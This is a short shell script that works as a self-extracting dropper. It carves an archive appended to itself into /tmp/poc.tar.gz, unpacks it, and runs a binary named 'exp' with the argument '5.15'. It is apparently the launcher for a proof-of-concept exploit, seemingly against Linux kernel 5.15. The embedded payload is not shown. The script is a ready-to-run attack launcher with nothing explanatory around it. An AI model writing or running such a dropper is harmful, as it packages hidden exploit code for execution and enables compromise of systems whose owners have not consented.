#!/bin/sh
dd if=$0 of=/tmp/poc.tar.gz skip=1
cd /tmp
tar -xf poc.tar.gz
./exp 5.15
exit
